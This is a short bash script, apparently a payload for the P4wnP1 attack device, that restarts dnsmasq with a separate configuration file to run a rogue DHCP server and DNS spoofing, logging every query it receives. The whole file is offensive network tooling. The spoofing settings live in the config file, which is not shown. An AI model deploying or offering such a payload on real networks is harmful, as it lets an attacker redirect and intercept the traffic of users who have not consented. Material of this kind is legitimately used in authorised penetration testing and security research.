#!/bin/bash
# payloads/network/rogue_dhcp_dns.sh

### Description: Rogue DHCP + DNS spoofing payload using dnsmasq
### Requirements: dnsmasq, custom dnsmasq.conf template

set -e

PAYLOAD_NAME="rogue_dhcp_dns"
LOG_DIR="/opt/p4wnp1/logs"
DNSMASQ_CONF="/opt/p4wnp1/config/${PAYLOAD_NAME}_dnsmasq.conf"

# Prepare log directory
mkdir -p "$LOG_DIR"

# Kill existing dnsmasq if running
pkill dnsmasq || true

# Start dnsmasq with rogue DHCP and DNS
if [ ! -f "$DNSMASQ_CONF" ]; then
  echo "[!] Missing config: $DNSMASQ_CONF"
  exit 1
fi

echo "[+] Launching dnsmasq for rogue DHCP/DNS..."
dnsmasq --conf-file="$DNSMASQ_CONF" --log-queries --log-facility="$LOG_DIR/${PAYLOAD_NAME}.log" &

echo "[+] Rogue DHCP + DNS started. Logs: $LOG_DIR/${PAYLOAD_NAME}.log"
exit 0
